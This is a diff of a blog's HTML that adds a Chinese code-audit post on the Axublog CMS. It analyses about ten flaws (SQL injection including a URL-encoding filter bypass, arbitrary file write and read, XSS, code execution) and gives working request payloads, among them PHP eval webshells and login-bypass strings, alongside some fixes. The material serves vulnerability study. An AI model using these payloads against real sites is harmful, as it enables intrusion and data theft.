@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Axublog," />
 
 
 
@@ -79,16 +79,41 @@
 
 
 
-<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
+<meta name="description" content="Axublog代码审计学习转载自：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;v01cano&#x2F;p&#x2F;12416366.html 1.前台数字型sql注入漏洞位置：axublog&#x2F;hit.php漏洞分析：hit.php漏洞关键代码： &lt;?php header(&quot;Content-type:text&#x2F;html; charset&#x3D;utf-8&quot;); require(&quot;c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Axublog代码审计学习">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
+<meta property="og:description" content="Axublog代码审计学习转载自：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;v01cano&#x2F;p&#x2F;12416366.html 1.前台数字型sql注入漏洞位置：axublog&#x2F;hit.php漏洞分析：hit.php漏洞关键代码： &lt;?php header(&quot;Content-type:text&#x2F;html; charset&#x3D;utf-8&quot;); require(&quot;c">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303210401433-2074327058.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211200124-595595133.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211645255-577074129.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303232615102-565416911.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234054140-229902481.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303233948167-467235758.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234320733-213715566.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234506377-737313316.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234835707-2141296773.png">
+<meta property="og:image" content="c:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5C1587018-20200304002821492-309441952.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003116729-1307171520.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003256803-1334544380.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172222897-1426655107.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172533350-1121177041.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172752867-937007122.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172922428-724640530.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304173840167-1365630191.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174437952-1224821444.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174618584-506013891.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304210913536-1220729563.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211607584-434322337.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211905560-277463672.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304212324112-1387100175.png">
 <meta property="article:published_time" content="2020-04-19T12:00:16.000Z">
-<meta property="article:modified_time" content="2020-04-20T06:01:52.030Z">
+<meta property="article:modified_time" content="2020-04-20T06:41:03.517Z">
 <meta property="article:author" content="Shu1L">
+<meta property="article:tag" content="Axublog">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303210401433-2074327058.png">
 
 
 
@@ -301,6 +326,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -328,7 +375,187 @@
       
 
       
-        
+        <h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><p><strong>转载自：</strong><a href="https://www.cnblogs.com/v01cano/p/12416366.html" target="_blank" rel="noopener">https://www.cnblogs.com/v01cano/p/12416366.html</a></p>
+<h4 id="1-前台数字型sql注入"><a href="#1-前台数字型sql注入" class="headerlink" title="1.前台数字型sql注入"></a>1.前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
+<pre><code>&lt;?php
+header(&quot;Content-type:text/html; charset=utf-8&quot;);
+require(&quot;cmsconfig.php&quot;);
+require(&quot;class/c_other.php&quot;);
+sqlguolv();
+
+$g=$_GET[&#39;g&#39;];
+
+
+if ($g==&#39;arthit&#39;){
+$id=$_GET[&#39;id&#39;];        
+    if($id!=&#39;&#39;){
+
+$tab=$tabhead.&quot;arts&quot;;
+mysql_select_db($tab);
+$sql=mysql_query(&quot;UPDATE &quot;.$tab.&quot; SET hit=hit+1 where id=&quot;.$id);  //直接将$_GET[&#39;id&#39;]提取的                                                                      id带入sql查询，没有经过                                                                      有效过滤
+$sql = mysql_query(&quot;select * from &quot;.$tab.&quot; where id=&quot;.$id);
+$row=mysql_fetch_array($sql);
+    $str=$row[&#39;hit&#39;];
+    echo &#39;document.write(&#39;.$str.&#39;);&#39;;
+    }
+}
+</code></pre><p>我们尝试直接传入payload尝试：</p>
+<pre><code>/hit/php?g=archit&amp;id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12</code></pre><p>发现被拦截。</p>
+<p>我们发现在get传参之前，有一个过滤函数。</p>
+<pre><code>if(sqlguolv()==1){die(&#39;禁止输入特殊符号和非法访问！&#39;);}</code></pre><p>我们找到这个函数：位于axublog\class\c_other.php:690行</p>
+<pre><code>Function sqlguolv() {
+@header(&quot;Content-type:text/html; charset=utf-8&quot;);
+$a=&#39;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&#39;|\\*|\*|union|into/i&#39;;
+if(preg_match($a,$_SERVER[&#39;QUERY_STRING&#39;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 ){return &quot;1&quot;;}
+}</code></pre><p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p>
+<p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p>
+<p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p>
+<p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p>
+<pre><code>?g=arthit&amp;id=-1%20%75nion%20%73elect%201,2,3,4,5,6,database(),8,9,10,11,12</code></pre><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p>
+<pre><code>$_SERVER[&#39;QUERY_STRING&#39;]=urldecode($_SERVER[&#39;QUERY_STRING&#39;]);</code></pre><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p>
+<pre><code>$id=intval($id);</code></pre><p>3.使用预编译技术和数据库进行交互。</p>
+<h3 id="2-任意文件上传漏洞"><a href="#2-任意文件上传漏洞" class="headerlink" title="2.任意文件上传漏洞"></a>2.任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p>
+<h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p>
+<pre><code>&lt;?php
+@$g=$_GET[&quot;g&quot;];
+?&gt;
+&lt;script src=&quot;jspost.js&quot;&gt;&lt;/script&gt; 
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    switch ($g)
+    {
+    default:index();break; 
+    case &quot;index&quot;:index();break; 
+    case &quot;savechoose&quot;:savechoose();break; 
+    case &quot;edit&quot;:edit();break; 
+        case &quot;edit2&quot;:edit2();break; 
+        case &quot;edit2save&quot;:edit2save();break; 
+    }</code></pre><p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p>
+<p>我们继续观察该函数功能：</p>
+<pre><code>&lt;?php 
+function edit2save(){
+global $themepath;
+?&gt;
+&lt;div class=&quot;yj_green&quot; id=full&gt;
+&lt;b class=&quot;b1&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b4&quot;&gt;&lt;/b&gt;
+&lt;div class=&quot;boxcontent&quot;&gt;
+&lt;h2&gt;&lt;a href=&quot;?&quot;&gt;主题管理&lt;/a&gt; &gt; &lt;a href=&quot;javascript:history.go(-2)&quot;&gt;编辑主题&lt;/a&gt; &gt; 编辑文件 &gt; &lt;a href=&quot;javascript:history.back()&quot;&gt;返回&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;div class=&quot;t1&quot;&gt;&lt;div class=&quot;t2&quot;&gt;
+&lt;?php
+$path=$_REQUEST[&#39;path&#39;];
+$content=stripslashes($_REQUEST[&#39;content&#39;]);
+?&gt;
+&lt;p&gt;编辑文件：&lt;?=$path?&gt;&lt;/p&gt;
+&lt;?php
+if($path==&#39;&#39;){echo&#39;文件路径错误！&#39;;exit;}
+
+if(file_put_contents ($path, $content)){echo&quot;保存文件成功！&quot;;} 
+else{echo&quot;保存文件失败！&quot;;}
+?&gt;</code></pre><p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p>
+<p>我们可以构造写入webshell的payload:</p>
+<pre><code>?g=edit2save&amp;path=../shell.php&amp;content=&lt;?php%20@eval($_POST[cmd]);?&gt;</code></pre><p>成功拿到webshell.</p>
+<h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p>
+<p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p>
+<pre><code>if($path!=&#39;../theme/default/about.mb&#39;){
+    echo &#39;about.mb地址不正确&#39;;
+    exit;
+}</code></pre><h3 id="3-后台生成about页面getshell"><a href="#3-后台生成about页面getshell" class="headerlink" title="3.后台生成about页面getshell"></a>3.后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p>
+<h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><pre><code>ob_start();
+include($mb);
+$html = ob_get_contents ();
+ob_clean();
+$html=mbreplace($html);
+file_put_contents ($cache, $html);
+
+echo &#39;生成about.html成功: &lt;a target=blank href=&quot;&#39;.$cache.&#39;&quot;&gt;访问&lt;/a&gt;&#39;;
+?&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;b class=&quot;b4b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b1b&quot;&gt;&lt;/b&gt;
+&lt;/div&gt;
+&lt;?php
+}
+?&gt;</code></pre><p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p>
+<p>我们在about.mb尾部添加如下代码：</p>
+<pre><code>&lt;?php 
+file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php @eval($_GET[&quot;a&quot;]); ?&gt;&#39;); 
+?&gt;</code></pre><p>然后使用菜刀连接即可getshell。</p>
+<h4 id="4-后台登录处的sql注入漏洞"><a href="#4-后台登录处的sql注入漏洞" class="headerlink" title="4.后台登录处的sql注入漏洞"></a>4.后台登录处的sql注入漏洞</h4><p>漏洞分析：</p>
+<p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303210401433-2074327058.png" alt="img"></p>
+<p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211200124-595595133.png" alt="img"></p>
+<p>漏洞利用：</p>
+<p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p>
+<pre><code>user:admin&#39; or 1=1#
+psw: 随意
+或者
+user: admin&#39; or 1#
+psw: 随意</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211645255-577074129.png" alt="img"></p>
+<h4 id="5-前台反射型xss漏洞"><a href="#5-前台反射型xss漏洞" class="headerlink" title="5.前台反射型xss漏洞"></a>5.前台反射型xss漏洞</h4><p>漏洞分析：</p>
+<p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303232615102-565416911.png" alt="img"></p>
+<p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234054140-229902481.png" alt="img"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303233948167-467235758.png" alt="img"></p>
+<p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234320733-213715566.png" alt="img"></p>
+<p>漏洞利用：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234506377-737313316.png" alt="img"></p>
+<h4 id="6-前台sql注入漏洞"><a href="#6-前台sql注入漏洞" class="headerlink" title="6.前台sql注入漏洞"></a>6.前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234835707-2141296773.png" alt="img"></p>
+<p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p>
+<p>漏洞利用：</p>
+<pre><code>执行如下poc时候返回正确结果：
+http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=1--+
+执行如下poc时候无结果返回：
+http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="7-后台任意文件写入漏洞"><a href="#7-后台任意文件写入漏洞" class="headerlink" title="7.后台任意文件写入漏洞"></a>7.后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p>
+<p>漏洞点：admin/theme.php</p>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5C1587018-20200304002821492-309441952.png" alt=""></p>
+<p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p>
+<p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003116729-1307171520.png" alt="img"></p>
+<p>漏洞利用：</p>
+<pre><code>请求：
+http://192.168.110.152/axublog/admin/theme.php?g=edit2save
+
+post:
+path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003256803-1334544380.png" alt="img"></p>
+<h4 id="8-后台多个sql注入漏洞"><a href="#8-后台多个sql注入漏洞" class="headerlink" title="8.后台多个sql注入漏洞"></a>8.后台多个sql注入漏洞</h4><p>漏洞点：admin/admin.php</p>
+<p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172222897-1426655107.png" alt="img"></p>
+<p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172533350-1121177041.png" alt="img"></p>
+<p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p>
+<p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172752867-937007122.png" alt="img"></p>
+<p>漏洞利用：</p>
+<pre><code>poc:
+http://192.168.110.152/axublog/admin/admin.php?g=edit&amp;id=1 union select 1,version(),3,4--+
+
+Referer: 任意填写</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172922428-724640530.png" alt="img"></p>
+<p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p>
+<h4 id="9-任意文件读取漏洞"><a href="#9-任意文件读取漏洞" class="headerlink" title="9.任意文件读取漏洞"></a>9.任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p>
+<p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304173840167-1365630191.png" alt="img"></p>
+<p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174437952-1224821444.png" alt="img"></p>
+<p>漏洞利用：</p>
+<pre><code>poc:
+http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><h4 id="10代码执行漏洞"><a href="#10代码执行漏洞" class="headerlink" title="10代码执行漏洞"></a><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174618584-506013891.png" alt="">10代码执行漏洞</h4><p>漏洞点：admin/html.php</p>
+<p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304210913536-1220729563.png" alt="img"></p>
+<p>漏洞利用：</p>
+<p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211607584-434322337.png" alt="img"></p>
+<p>保存编辑后选择生成about：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211905560-277463672.png" alt="img"></p>
+<p>然后我们的代码就被成功的执行了，访问shell2.php:</p>
+<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304212324112-1387100175.png" alt="img"></p>
+<p>res:<br><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p>
+<p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>
+
       
     </div>
     
@@ -342,6 +569,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Axublog/" rel="tag"># Axublog</a>
+          
+        </div>
       
 
       
@@ -416,8 +649,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -432,7 +674,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -454,7 +696,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -477,6 +719,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Axublog代码审计学习"><span class="nav-number">1.</span> <span class="nav-text">Axublog代码审计学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-前台数字型sql注入"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.前台数字型sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞位置：axublog-hit-php"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">漏洞位置：axublog&#x2F;hit.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析："><span class="nav-number">1.0.1.2.</span> <span class="nav-text">漏洞分析：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞修复："><span class="nav-number">1.0.1.3.</span> <span class="nav-text">漏洞修复：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-任意文件上传漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">2.任意文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞位置："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">漏洞位置：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析：-1"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">漏洞分析：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复方案："><span class="nav-number">1.1.0.3.</span> <span class="nav-text">修复方案：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-后台生成about页面getshell"><span class="nav-number">1.2.</span> <span class="nav-text">3.后台生成about页面getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞位置：-1"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">漏洞位置：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析：-2"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">漏洞分析：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-后台登录处的sql注入漏洞"><span class="nav-number">1.2.1.</span> <span class="nav-text">4.后台登录处的sql注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-前台反射型xss漏洞"><span class="nav-number">1.2.2.</span> <span class="nav-text">5.前台反射型xss漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-前台sql注入漏洞"><span class="nav-number">1.2.3.</span> <span class="nav-text">6.前台sql注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-后台任意文件写入漏洞"><span class="nav-number">1.2.4.</span> <span class="nav-text">7.后台任意文件写入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-后台多个sql注入漏洞"><span class="nav-number">1.2.5.</span> <span class="nav-text">8.后台多个sql注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-任意文件读取漏洞"><span class="nav-number">1.2.6.</span> <span class="nav-text">9.任意文件读取漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10代码执行漏洞"><span class="nav-number">1.2.7.</span> <span class="nav-text">10代码执行漏洞</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
